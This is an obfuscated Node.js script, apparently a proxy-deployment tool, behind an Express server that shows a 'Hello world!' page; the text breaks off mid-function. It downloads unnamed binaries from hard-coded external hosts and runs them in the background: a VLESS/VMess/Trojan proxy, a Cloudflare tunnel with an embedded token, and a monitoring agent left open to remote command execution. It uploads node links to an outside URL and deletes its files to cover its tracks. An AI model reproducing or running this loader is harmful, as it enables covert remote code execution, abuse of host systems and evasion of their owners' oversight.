const _0x2cbcbc=_0x49ec;(function(_0x1f5439,_0x14a30e){const _0x15b7d5=_0x49ec,_0xf36640=_0x1f5439();while(!![]){try{const _0x26078f=-parseInt(_0x15b7d5(0x176))/0x1*(parseInt(_0x15b7d5(0x1c4))/0x2)+-parseInt(_0x15b7d5(0x19d))/0x3*(parseInt(_0x15b7d5(0x15f))/0x4)+-parseInt(_0x15b7d5(0x20d))/0x5*(parseInt(_0x15b7d5(0x196))/0x6)+parseInt(_0x15b7d5(0x20a))/0x7+-parseInt(_0x15b7d5(0x19c))/0x8+-parseInt(_0x15b7d5(0x190))/0x9+-parseInt(_0x15b7d5(0x15b))/0xa*(-parseInt(_0x15b7d5(0x1f8))/0xb);if(_0x26078f===_0x14a30e)break;else _0xf36640['push'](_0xf36640['shift']());}catch(_0x11e448){_0xf36640['push'](_0xf36640['shift']());}}}(_0xe4fe,0x74bb0));const express=require(_0x2cbcbc(0x214)),app=express(),axios=require(_0x2cbcbc(0x1df)),os=require('os'),fs=require('fs'),path=require(_0x2cbcbc(0x195)),{promisify}=require(_0x2cbcbc(0x1cb)),exec=promisify(require(_0x2cbcbc(0x165))['exec']),{execSync}=require(_0x2cbcbc(0x165)),UPLOAD_URL=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x1dc)]||'',PROJECT_URL=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x1d1)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x189)]||_0x2cbcbc(0x1f5),SUB_PATH=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x1a0)]||_0x2cbcbc(0x1e0),PORT=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x202)]||process[_0x2cbcbc(0x184)]['PORT']||0xbb8,UUID=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x19f)]||_0x2cbcbc(0x1d7),NEZHA_SERVER=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x16a)]||'',NEZHA_PORT=process['env'][_0x2cbcbc(0x210)]||'',NEZHA_KEY=process[_0x2cbcbc(0x184)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x1e1)]||_0x2cbcbc(0x199),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x2cbcbc(0x172),ARGO_PORT=process['env'][_0x2cbcbc(0x1ac)]||0x1f41,CFIP=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x1c9)]||_0x2cbcbc(0x182),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x2cbcbc(0x184)][_0x2cbcbc(0x1c5)]||_0x2cbcbc(0x1c0);!fs[_0x2cbcbc(0x1ad)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x2cbcbc(0x198))):console[_0x2cbcbc(0x1d5)](FILE_PATH+_0x2cbcbc(0x1f0));function generateRandomName(){const _0x39dab3=_0x2cbcbc,_0x3a7660=_0x39dab3(0x1a8);let _0x3a80cc='';for(let _0x3ecbe5=0x0;_0x3ecbe5<0x6;_0x3ecbe5++){_0x3a80cc+=_0x3a7660['charAt'](Math[_0x39dab3(0x217)](Math[_0x39dab3(0x1a6)]()*_0x3a7660[_0x39dab3(0x158)]));}return _0x3a80cc;}function _0x49ec(_0x399ab8,_0x1fbaf3){const _0xe4fec8=_0xe4fe();return _0x49ec=function(_0x49ec57,_0x308cf3){_0x49ec57=_0x49ec57-0x157;let _0x5dbf59=_0xe4fec8[_0x49ec57];return _0x5dbf59;},_0x49ec(_0x399ab8,_0x1fbaf3);}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2cbcbc(0x219)](FILE_PATH,npmName),phpPath=path[_0x2cbcbc(0x219)](FILE_PATH,phpName),webPath=path[_0x2cbcbc(0x219)](FILE_PATH,webName),botPath=path[_0x2cbcbc(0x219)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2cbcbc(0x1be)),listPath=path[_0x2cbcbc(0x219)](FILE_PATH,_0x2cbcbc(0x181)),bootLogPath=path['join'](FILE_PATH,_0x2cbcbc(0x203)),configPath=path[_0x2cbcbc(0x219)](FILE_PATH,_0x2cbcbc(0x1c7));function deleteNodes(){const _0x371e54=_0x2cbcbc;try{if(!UPLOAD_URL)return;if(!fs[_0x371e54(0x1ad)](subPath))return;let _0xedc1a8;try{_0xedc1a8=fs[_0x371e54(0x1ec)](subPath,_0x371e54(0x16c));}catch{return null;}const _0x2d414c=Buffer[_0x371e54(0x211)](_0xedc1a8,_0x371e54(0x1af))['toString']('utf-8'),_0x21444b=_0x2d414c[_0x371e54(0x1e6)]('\x0a')[_0x371e54(0x16e)](_0x4ec0d6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4ec0d6));if(_0x21444b[_0x371e54(0x158)]===0x0)return;return axios[_0x371e54(0x16d)](UPLOAD_URL+_0x371e54(0x1fa),JSON[_0x371e54(0x183)]({'nodes':_0x21444b}),{'headers':{'Content-Type':_0x371e54(0x17a)}})[_0x371e54(0x1c1)](_0x452153=>{return null;}),null;}catch(_0x116784){return null;}}function cleanupOldFiles(){const _0x2508af=_0x2cbcbc;try{const _0x454e2e=fs['readdirSync'](FILE_PATH);_0x454e2e[_0x2508af(0x1f7)](_0x12410c=>{const _0x391e15=_0x2508af,_0x4792a6=path['join'](FILE_PATH,_0x12410c);try{const _0x2d6425=fs['statSync'](_0x4792a6);_0x2d6425[_0x391e15(0x18f)]()&&fs[_0x391e15(0x20b)](_0x4792a6);}catch(_0x512915){}});}catch(_0x2f47a4){}}app[_0x2cbcbc(0x1a4)]('/',function(_0x1ca1d8,_0x22a65e){const _0x21b7b9=_0x2cbcbc;_0x22a65e[_0x21b7b9(0x16f)](_0x21b7b9(0x1fd));});async function generateConfig(){const _0x1cc5c3=_0x2cbcbc,_0x3a4aa5={'log':{'access':_0x1cc5c3(0x17e),'error':_0x1cc5c3(0x17e),'loglevel':_0x1cc5c3(0x1ea)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1cc5c3(0x1f1),'settings':{'clients':[{'id':UUID,'flow':_0x1cc5c3(0x1a3)}],'decryption':_0x1cc5c3(0x1ea),'fallbacks':[{'dest':0xbb9},{'path':_0x1cc5c3(0x1e7),'dest':0xbba},{'path':_0x1cc5c3(0x18c),'dest':0xbbb},{'path':_0x1cc5c3(0x20c),'dest':0xbbc}]},'streamSettings':{'network':_0x1cc5c3(0x1b5)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x1cc5c3(0x1f1),'settings':{'clients':[{'id':UUID}],'decryption':_0x1cc5c3(0x1ea)},'streamSettings':{'network':_0x1cc5c3(0x1b5),'security':'none'}},{'port':0xbba,'listen':_0x1cc5c3(0x191),'protocol':_0x1cc5c3(0x1f1),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1cc5c3(0x1ea)},'streamSettings':{'network':'ws','security':_0x1cc5c3(0x1ea),'wsSettings':{'path':_0x1cc5c3(0x1e7)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1cc5c3(0x186),_0x1cc5c3(0x1fe)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x1cc5c3(0x1d9),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1cc5c3(0x18c)}},'sniffing':{'enabled':!![],'destOverride':[_0x1cc5c3(0x1a2),_0x1cc5c3(0x186),_0x1cc5c3(0x1fe)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1cc5c3(0x191),'protocol':_0x1cc5c3(0x216),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1cc5c3(0x1ea),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1cc5c3(0x1a2),_0x1cc5c3(0x186),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1cc5c3(0x161),'tag':_0x1cc5c3(0x209)},{'protocol':'blackhole','tag':_0x1cc5c3(0x1b0)}]};fs[_0x1cc5c3(0x1d0)](path['join'](FILE_PATH,_0x1cc5c3(0x1c7)),JSON[_0x1cc5c3(0x183)](_0x3a4aa5,null,0x2));}function getSystemArchitecture(){const _0x90ba63=_0x2cbcbc,_0x10c2c6=os[_0x90ba63(0x17b)]();return _0x10c2c6==='arm'||_0x10c2c6===_0x90ba63(0x159)||_0x10c2c6==='aarch64'?'arm':_0x90ba63(0x16b);}function _0xe4fe(){const _0x5a04eb=['236aJXGto','\x0a\x0atrojan://','freedom','443','https://arm64.ssss.nyc.mn/v1','web\x20running\x20error:\x20','child_process','\x20failed:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','fileUrl','https://oooo.serv00.net/add-url','NEZHA_SERVER','amd','utf-8','post','filter','send','country_code','countryCode','eyJhIjoiNzYyYjk3NWRmZDA0MGNlYTA3NWUzODNlM2E1OWE5NTEiLCJ0IjoiNjhjZDExZDEtYjA0Yi00ZDVmLWFjZjctYWNkZjA4MTMyMjBmIiwicyI6Ik9HSmxNelF4WXpjdE1qSXlNaTAwTVRNMkxUZzFZVGt0WlRFMU5qYzRZV1kwWTJZNSJ9','Error\x20downloading\x20files:','http://ip-api.com/json/','&path=%2Fvless-argo%3Fed%3D2560#','1HispoS','automatic\x20access\x20task\x20added\x20successfully','tunnel.json','taskkill\x20/f\x20/im\x20','application/json','arch','8443','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/dev/null','ArgoDomain:','pipe','list.txt','cdns.doon.eu.org','stringify','env','https://amd64.ssss.nyc.mn/v1','tls','/api/add-subscriptions','php\x20running\x20error:\x20','FILE_PATH','false','?encryption=none&security=tls&sni=','/vmess-argo','\x20>\x20nul\x202>&1','https://ipapi.co/json/','isFile','7638408GAWxYS','127.0.0.1','\x0a\x20\x20tunnel:\x20','https://arm64.ssss.nyc.mn/bot','has','path','24htEyIC','2053','\x20is\x20created','ai.iaiia.ggff.net','del\x20/f\x20/q\x20','finish','23832TorcGm','40632VfJWLS','success','UUID','SUB_PATH','Nodes\x20uploaded\x20successfully','http','xtls-rprx-vision','get','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','random','--tls','abcdefghijklmnopqrstuvwxyz','unshift','config.yaml','tunnel.yml','ARGO_PORT','existsSync','map','base64','block','\x20-p\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','.exe\x20>\x20nul\x202>&1','pop','tcp','Error\x20reading\x20boot.log:','TunnelSecret','&fp=firefox&type=ws&host=','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','App\x20is\x20running','\x20>/dev/null\x202>&1\x20&','nohup\x20','error','sub.txt','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ysip','catch','text/plain;\x20charset=utf-8','\x0a\x20\x20\x20\x20','807196ksRuQz','NAME','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','config.json','\x0aclient_secret:\x20','CFIP','win32','util','stream','arm','test','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','writeFileSync','PROJECT_URL','Empowerment\x20success\x20for\x20','\x20successfully','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','log','clear','f15e5008-bc84-4842-adb2-e1e7167ad1ac','org','vmess','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Download\x20','UPLOAD_URL','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','axios','1212sub','ARGO_DOMAIN','\x0avless://','pkill\x20-f\x20\x22[','Content-Type','close','split','/vless-argo','then','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','none','&path=%2Ftrojan-argo%3Fed%3D2560#','readFileSync','NEZHA\x20variable\x20is\x20empty,skip\x20running','message','listen','\x20already\x20exists','vless','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','match','platform','./tmp','set','forEach','29960601AEKAxk','/api/add-nodes','/api/delete-nodes','\x20>/dev/null\x202>&1','/vmess-argo?ed=2560','Hello\x20world!','quic','/sub.txt\x20saved\x20successfully','\x20-c\x20\x22','\x20-c\x20','SERVER_PORT','boot.log','Add\x20automatic\x20access\x20task\x20faild:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20is\x20running','https://amd64.ssss.nyc.mn/agent','Unhandled\x20error\x20in\x20startserver:','direct','1312206SkxHmK','unlinkSync','/trojan-argo','473295xhZnhs','true','mkdirSync','NEZHA_PORT','from','status','2083','express','includes','trojan','floor','Unknown','join','Skipping\x20adding\x20automatic\x20access\x20task','data','2096','toString','length','arm64','push','10OVhUCS','2087','https://arm64.ssss.nyc.mn/agent','basename'];_0xe4fe=function(){return _0x5a04eb;};return _0xe4fe();}function downloadFile(_0x5323d1,_0x5ed8fd,_0x2aecbe){const _0x359776=_0x2cbcbc,_0x327919=_0x5323d1;!fs[_0x359776(0x1ad)](FILE_PATH)&&fs[_0x359776(0x20f)](FILE_PATH,{'recursive':!![]});const _0x4c5fc0=fs['createWriteStream'](_0x327919);axios({'method':_0x359776(0x1a4),'url':_0x5ed8fd,'responseType':_0x359776(0x1cc)})[_0x359776(0x1e8)](_0x1f44e2=>{const _0x53fb26=_0x359776;_0x1f44e2['data'][_0x53fb26(0x180)](_0x4c5fc0),_0x4c5fc0['on'](_0x53fb26(0x19b),()=>{const _0x52be7d=_0x53fb26;_0x4c5fc0[_0x52be7d(0x1e5)](),console['log']('Download\x20'+path['basename'](_0x327919)+_0x52be7d(0x1d3)),_0x2aecbe(null,_0x327919);}),_0x4c5fc0['on']('error',_0x1fa56c=>{const _0x42fbd0=_0x53fb26;fs['unlink'](_0x327919,()=>{});const _0x1e0682='Download\x20'+path[_0x42fbd0(0x15e)](_0x327919)+_0x42fbd0(0x166)+_0x1fa56c[_0x42fbd0(0x1ee)];console[_0x42fbd0(0x1bd)](_0x1e0682),_0x2aecbe(_0x1e0682);});})[_0x359776(0x1c1)](_0x19fe9e=>{const _0x48fe23=_0x359776,_0x5a06e5=_0x48fe23(0x1db)+path[_0x48fe23(0x15e)](_0x327919)+'\x20failed:\x20'+_0x19fe9e[_0x48fe23(0x1ee)];console['error'](_0x5a06e5),_0x2aecbe(_0x5a06e5);});}async function downloadFilesAndRun(){const _0xe44727=_0x2cbcbc,_0x55b8c4=getSystemArchitecture(),_0xff6032=getFilesForArchitecture(_0x55b8c4);if(_0xff6032['length']===0x0){console[_0xe44727(0x1d5)](_0xe44727(0x1b9));return;}const _0x1ef1a3=_0xff6032[_0xe44727(0x1ae)](_0x5bede4=>{return new Promise((_0x5b33bb,_0x5da98f)=>{const _0x4de7ec=_0x49ec;downloadFile(_0x5bede4['fileName'],_0x5bede4[_0x4de7ec(0x168)],(_0x2da72f,_0x455131)=>{_0x2da72f?_0x5da98f(_0x2da72f):_0x5b33bb(_0x455131);});});});try{await Promise['all'](_0x1ef1a3);}catch(_0xda1a73){console[_0xe44727(0x1bd)](_0xe44727(0x173),_0xda1a73);return;}function _0x22ab0c(_0x4d4c5c){const _0x72c891=_0xe44727,_0x18aceb=0x1fd;_0x4d4c5c[_0x72c891(0x1f7)](_0x453990=>{const _0x5e6563=_0x72c891;fs[_0x5e6563(0x1ad)](_0x453990)&&fs['chmod'](_0x453990,_0x18aceb,_0x1e0138=>{const _0x17704a=_0x5e6563;_0x1e0138?console[_0x17704a(0x1bd)]('Empowerment\x20failed\x20for\x20'+_0x453990+':\x20'+_0x1e0138):console['log'](_0x17704a(0x1d2)+_0x453990+':\x20'+_0x18aceb[_0x17704a(0x157)](0x8));});});}const _0x559e06=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x22ab0c(_0x559e06);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xe302d5=NEZHA_SERVER[_0xe44727(0x215)](':')?NEZHA_SERVER[_0xe44727(0x1e6)](':')[_0xe44727(0x1b4)]():'',_0x510935=new Set([_0xe44727(0x162),_0xe44727(0x17c),_0xe44727(0x21c),_0xe44727(0x15c),_0xe44727(0x213),_0xe44727(0x197)]),_0x3ef1b2=_0x510935[_0xe44727(0x194)](_0xe302d5)?_0xe44727(0x20e):_0xe44727(0x18a),_0x5a9c80=_0xe44727(0x1c8)+NEZHA_KEY+_0xe44727(0x1cf)+NEZHA_SERVER+_0xe44727(0x1de)+_0x3ef1b2+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0xe44727(0x1d0)](path[_0xe44727(0x219)](FILE_PATH,_0xe44727(0x1aa)),_0x5a9c80);const _0x58c17f=_0xe44727(0x1bc)+phpPath+_0xe44727(0x200)+FILE_PATH+_0xe44727(0x1d4);try{await exec(_0x58c17f),console['log'](phpName+_0xe44727(0x206)),await new Promise(_0x54b8e1=>setTimeout(_0x54b8e1,0x3e8));}catch(_0x30b45e){console['error'](_0xe44727(0x188)+_0x30b45e);}}else{let _0x238c5c='';const _0x582ae6=[_0xe44727(0x162),_0xe44727(0x17c),_0xe44727(0x21c),_0xe44727(0x15c),_0xe44727(0x213),_0xe44727(0x197)];_0x582ae6['includes'](NEZHA_PORT)&&(_0x238c5c=_0xe44727(0x1a7));const _0xfaca1f=_0xe44727(0x1bc)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0xe44727(0x1b1)+NEZHA_KEY+'\x20'+_0x238c5c+_0xe44727(0x1a5);try{await exec(_0xfaca1f),console[_0xe44727(0x1d5)](npmName+_0xe44727(0x206)),await new Promise(_0x2a9da0=>setTimeout(_0x2a9da0,0x3e8));}catch(_0x3796d4){console['error']('npm\x20running\x20error:\x20'+_0x3796d4);}}}else console[_0xe44727(0x1d5)](_0xe44727(0x1ed));const _0x4e65f0=_0xe44727(0x1bc)+webPath+_0xe44727(0x201)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4e65f0),console[_0xe44727(0x1d5)](webName+_0xe44727(0x206)),await new Promise(_0x3e2ec8=>setTimeout(_0x3e2ec8,0x3e8));}catch(_0x9a11a){console['error'](_0xe44727(0x164)+_0x9a11a);}if(fs[_0xe44727(0x1ad)](botPath)){let _0x3cd309;if(ARGO_AUTH[_0xe44727(0x1f3)](/^[A-Z0-9a-z=]{120,250}$/))_0x3cd309=_0xe44727(0x1c6)+ARGO_AUTH;else ARGO_AUTH[_0xe44727(0x1f3)](/TunnelSecret/)?_0x3cd309=_0xe44727(0x1f2)+FILE_PATH+'/tunnel.yml\x20run':_0x3cd309='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xe44727(0x167)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3cd309+_0xe44727(0x1bb)),console[_0xe44727(0x1d5)](botName+_0xe44727(0x206)),await new Promise(_0x2cba31=>setTimeout(_0x2cba31,0x7d0));}catch(_0x2c5027){console[_0xe44727(0x1bd)]('Error\x20executing\x20command:\x20'+_0x2c5027);}}await new Promise(_0xa86ad1=>setTimeout(_0xa86ad1,0x1388));}function getFilesForArchitecture(_0x40efc2){const _0xa3bb6d=_0x2cbcbc;let _0x47a3ab;_0x40efc2===_0xa3bb6d(0x1cd)?_0x47a3ab=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0xa3bb6d(0x193)}]:_0x47a3ab=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x82cd8d=_0x40efc2===_0xa3bb6d(0x1cd)?_0xa3bb6d(0x15d):_0xa3bb6d(0x207);_0x47a3ab[_0xa3bb6d(0x1a9)]({'fileName':npmPath,'fileUrl':_0x82cd8d});}else{const _0x3bbcf1=_0x40efc2===_0xa3bb6d(0x1cd)?_0xa3bb6d(0x163):_0xa3bb6d(0x185);_0x47a3ab[_0xa3bb6d(0x1a9)]({'fileName':phpPath,'fileUrl':_0x3bbcf1});}}return _0x47a3ab;}function argoType(){const _0x463e5b=_0x2cbcbc;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x463e5b(0x215)](_0x463e5b(0x1b7))){fs[_0x463e5b(0x1d0)](path[_0x463e5b(0x219)](FILE_PATH,_0x463e5b(0x178)),ARGO_AUTH);const _0x4c53ed=_0x463e5b(0x192)+ARGO_AUTH[_0x463e5b(0x1e6)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x463e5b(0x178))+_0x463e5b(0x1bf)+ARGO_DOMAIN+_0x463e5b(0x1dd)+ARGO_PORT+_0x463e5b(0x17d);fs['writeFileSync'](path[_0x463e5b(0x219)](FILE_PATH,_0x463e5b(0x1ab)),_0x4c53ed);}else console[_0x463e5b(0x1d5)](_0x463e5b(0x1da));}async function extractDomains(){const _0x1e04c7=_0x2cbcbc;let _0x245809;if(ARGO_AUTH&&ARGO_DOMAIN)_0x245809=ARGO_DOMAIN,console[_0x1e04c7(0x1d5)]('ARGO_DOMAIN:',_0x245809),await _0x3ce08b(_0x245809);else try{const _0x3eec74=fs[_0x1e04c7(0x1ec)](path[_0x1e04c7(0x219)](FILE_PATH,'boot.log'),_0x1e04c7(0x16c)),_0x3b23f2=_0x3eec74[_0x1e04c7(0x1e6)]('\x0a'),_0xfeac8b=[];_0x3b23f2['forEach'](_0x4e1796=>{const _0x2c5f76=_0x1e04c7,_0x25b907=_0x4e1796[_0x2c5f76(0x1f3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x25b907){const _0x1f82fa=_0x25b907[0x1];_0xfeac8b['push'](_0x1f82fa);}});if(_0xfeac8b[_0x1e04c7(0x158)]>0x0)_0x245809=_0xfeac8b[0x0],console[_0x1e04c7(0x1d5)](_0x1e04c7(0x17f),_0x245809),await _0x3ce08b(_0x245809);else{console[_0x1e04c7(0x1d5)](_0x1e04c7(0x205)),fs[_0x1e04c7(0x20b)](path['join'](FILE_PATH,_0x1e04c7(0x203)));async function _0x1ed216(){const _0x175558=_0x1e04c7;try{process[_0x175558(0x1f4)]===_0x175558(0x1ca)?await exec(_0x175558(0x179)+botName+_0x175558(0x1b3)):await exec(_0x175558(0x1e3)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x569fe6){}}_0x1ed216(),await new Promise(_0x3f4d16=>setTimeout(_0x3f4d16,0xbb8));const _0x1246d0=_0x1e04c7(0x1b2)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1e04c7(0x1bc)+botPath+'\x20'+_0x1246d0+_0x1e04c7(0x1bb)),console[_0x1e04c7(0x1d5)](botName+'\x20is\x20running'),await new Promise(_0x2e2170=>setTimeout(_0x2e2170,0xbb8)),await extractDomains();}catch(_0x59b13c){console[_0x1e04c7(0x1bd)]('Error\x20executing\x20command:\x20'+_0x59b13c);}}}catch(_0x54af55){console[_0x1e04c7(0x1bd)](_0x1e04c7(0x1b6),_0x54af55);}async function _0x430474(){const _0x6b2fd=_0x1e04c7;try{const _0x31cf90=await axios['get'](_0x6b2fd(0x18e),{'timeout':0xbb8});if(_0x31cf90[_0x6b2fd(0x21b)]&&_0x31cf90[_0x6b2fd(0x21b)][_0x6b2fd(0x170)]&&_0x31cf90[_0x6b2fd(0x21b)][_0x6b2fd(0x1d8)])return _0x31cf90[_0x6b2fd(0x21b)][_0x6b2fd(0x170)]+'_'+_0x31cf90[_0x6b2fd(0x21b)][_0x6b2fd(0x1d8)];}catch(_0x499348){try{const _0x555a39=await axios[_0x6b2fd(0x1a4)](_0x6b2fd(0x174),{'timeout':0xbb8});if(_0x555a39[_0x6b2fd(0x21b)]&&_0x555a39[_0x6b2fd(0x21b)][_0x6b2fd(0x212)]===_0x6b2fd(0x19e)&&_0x555a39[_0x6b2fd(0x21b)][_0x6b2fd(0x171)]&&_0x555a39['data'][_0x6b2fd(0x1d8)])return _0x555a39[_0x6b2fd(0x21b)][_0x6b2fd(0x171)]+'_'+_0x555a39['data'][_0x6b2fd(0x1d8)];}catch(_0x200be2){}}return _0x6b2fd(0x218);}async function _0x3ce08b(_0x46c1af){const _0x345c87=await _0x430474(),_0x29ddfe=NAME?NAME+'-'+_0x345c87:_0x345c87;return new Promise(_0x34b503=>{setTimeout(()=>{const _0x50cde7=_0x49ec,_0x272422={'v':'2','ps':''+_0x29ddfe,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x46c1af,'path':_0x50cde7(0x1fc),'tls':_0x50cde7(0x186),'sni':_0x46c1af,'alpn':'','fp':'firefox'},_0x47f44e=_0x50cde7(0x1e2)+UUID+'@'+CFIP+':'+CFPORT+_0x50cde7(0x18b)+_0x46c1af+_0x50cde7(0x1b8)+_0x46c1af+_0x50cde7(0x175)+_0x29ddfe+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x50cde7(0x183)](_0x272422))[_0x50cde7(0x157)](_0x50cde7(0x1af))+_0x50cde7(0x160)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x46c1af+'&fp=firefox&type=ws&host='+_0x46c1af+_0x50cde7(0x1eb)+_0x29ddfe+_0x50cde7(0x1c3);console[_0x50cde7(0x1d5)](Buffer['from'](_0x47f44e)[_0x50cde7(0x157)](_0x50cde7(0x1af))),fs[_0x50cde7(0x1d0)](subPath,Buffer[_0x50cde7(0x211)](_0x47f44e)[_0x50cde7(0x157)](_0x50cde7(0x1af))),console[_0x50cde7(0x1d5)](FILE_PATH+_0x50cde7(0x1ff)),uploadNodes(),app['get']('/'+SUB_PATH,(_0xb5770c,_0x9d056c)=>{const _0x286960=_0x50cde7,_0x2c22bf=Buffer[_0x286960(0x211)](_0x47f44e)[_0x286960(0x157)](_0x286960(0x1af));_0x9d056c[_0x286960(0x1f6)](_0x286960(0x1e4),_0x286960(0x1c2)),_0x9d056c[_0x286960(0x16f)](_0x2c22bf);}),_0x34b503(_0x47f44e);},0x7d0);});}}async function uploadNodes(){const _0x51666a=_0x2cbcbc;if(UPLOAD_URL&&PROJECT_URL){const _0x268221=PROJECT_URL+'/'+SUB_PATH,_0xa897b0={'subscription':[_0x268221]};try{const _0x380710=await axios[_0x51666a(0x16d)](UPLOAD_URL+_0x51666a(0x187),_0xa897b0,{'headers':{'Content-Type':'application/json'}});return _0x380710&&_0x380710['status']===0xc8?(console[_0x51666a(0x1d5)]('Subscription\x20uploaded\x20successfully'),_0x380710):null;}catch(_0x427f3a){if(_0x427f3a['response']){if(_0x427f3a['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x51666a(0x1ad)](listPath))return;const _0x37f52e=fs['readFileSync'](listPath,_0x51666a(0x16c)),_0x14451d=_0x37f52e[_0x51666a(0x1e6)]('\x0a')[_0x51666a(0x16e)](_0x2e1d77=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x51666a(0x1ce)](_0x2e1d77));if(_0x14451d[_0x51666a(0x158)]===0x0)return;const _0x19cdaf=JSON[_0x51666a(0x183)]({'nodes':_0x14451d});try{const _0x30c60f=await axios['post'](UPLOAD_URL+_0x51666a(0x1f9),_0x19cdaf,{'headers':{'Content-Type':_0x51666a(0x17a)}});return _0x30c60f&&_0x30c60f[_0x51666a(0x212)]===0xc8?(console['log'](_0x51666a(0x1a1)),_0x30c60f):null;}catch(_0x835b32){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5dc52c=_0x49ec,_0x32d356=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x32d356[_0x5dc52c(0x15a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x32d356[_0x5dc52c(0x15a)](phpPath);process[_0x5dc52c(0x1f4)]==='win32'?exec(_0x5dc52c(0x19a)+_0x32d356['join']('\x20')+_0x5dc52c(0x18d),_0x567326=>{const _0xfb6b71=_0x5dc52c;console[_0xfb6b71(0x1d6)](),console[_0xfb6b71(0x1d5)](_0xfb6b71(0x1ba)),console[_0xfb6b71(0x1d5)](_0xfb6b71(0x1e9));}):exec('rm\x20-rf\x20'+_0x32d356['join']('\x20')+_0x5dc52c(0x1fb),_0x39a14e=>{const 